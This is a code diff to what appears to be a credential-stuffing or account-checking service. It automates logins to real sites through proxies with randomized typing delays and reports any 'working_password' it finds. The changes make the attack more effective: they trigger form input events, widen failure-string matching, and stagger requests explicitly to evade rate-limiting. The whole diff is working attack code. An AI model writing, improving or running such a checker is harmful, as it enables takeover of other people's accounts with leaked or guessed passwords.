@@ -346,8 +346,8 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
             await page.evaluate(() => {
               const ui = document.querySelector(${JSON.stringify(userSel)});
               const pi = document.querySelector(${JSON.stringify(passSel)});
-              if (ui) ui.value = '';
-              if (pi) pi.value = '';
+              if (ui) { ui.value = ''; ui.dispatchEvent(new Event('input', { bubbles: true })); ui.dispatchEvent(new Event('change', { bubbles: true })); }
+              if (pi) { pi.value = ''; pi.dispatchEvent(new Event('input', { bubbles: true })); pi.dispatchEvent(new Event('change', { bubbles: true })); }
             });
 
             await page.type(userSel, email, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
@@ -366,7 +366,8 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
             if (lowerText.includes('disabled') || lowerText.includes('has been disabled')) {
                return { data: { status: 'failed', final_url: page.url(), elapsed: Date.now() - started }, type: 'application/json' };
             }
-            if (!lowerText.includes('incorrect password')) {
+            const isError = lowerText.includes('incorrect') || lowerText.includes('invalid') || lowerText.includes('wrong');
+            if (!isError) {
                return { data: { status: 'working', working_password: pw, final_url: page.url(), elapsed: Date.now() - started }, type: 'application/json' };
             }
           }
@@ -424,8 +425,8 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
           await page.evaluate((uSel, pSel) => {
             const u = document.querySelector(uSel);
             const p = document.querySelector(pSel);
-            if (u) u.value = '';
-            if (p) p.value = '';
+            if (u) { u.value = ''; u.dispatchEvent(new Event('input', { bubbles: true })); u.dispatchEvent(new Event('change', { bubbles: true })); }
+            if (p) { p.value = ''; p.dispatchEvent(new Event('input', { bubbles: true })); p.dispatchEvent(new Event('change', { bubbles: true })); }
           }, userSel, passSel);
 
           await page.type(userSel, username, { delay: 50 }).catch(() => {});
@@ -443,7 +444,8 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
           if (text.includes('disabled') || text.includes('has been disabled')) {
             return { site_key: site.key, status: 'failed', final_url: page.url(), elapsed_ms: Date.now() - started, screenshots: [], success_marker_found: false };
           }
-          if (!text.includes('incorrect password')) {
+          const isError = text.includes('incorrect') || text.includes('invalid') || text.includes('wrong');
+          if (!isError) {
             return { site_key: site.key, status: 'working', working_password: pw, final_url: page.url(), elapsed_ms: Date.now() - started, success_marker_found: true, screenshots: [] };
           }
         }
@@ -495,7 +497,8 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
       if (body.includes("disabled")) {
         return { site_key: site.key, status: 'failed', final_url: json.resolved_url, success_marker_found: false, elapsed_ms: totalElapsed, screenshots: [] };
       }
-      if (!body.includes("incorrect password")) {
+      const isError = body.includes('incorrect') || body.includes('invalid') || body.includes('wrong');
+      if (!isError) {
         return { site_key: site.key, status: 'working', final_url: json.resolved_url, success_marker_found: true, working_password: pw, elapsed_ms: totalElapsed, screenshots: [] };
       }
       
@@ -607,7 +610,8 @@ Deno.serve(async (req) => {
       message: `Test start · ${username} · ${testSites.map((s) => s.key).join('+')} · proxy=${proxy.mode}/${proxy.country_code}`,
     });
 
-    const results = await Promise.all(testSites.map(async (s) => {
+    const results = await Promise.all(testSites.map(async (s, index) => {
+      if (index > 0) await new Promise(resolve => setTimeout(resolve, index * 2500)); // Stagger to prevent rate-limiting when hitting same CDN simultaneously
       const loginUrl = custom_url || s.login_url;
       if (!loginUrl) {
         return { site_key: s.key, status: 'error', error_message: 'No login_url', elapsed_ms: 0 };
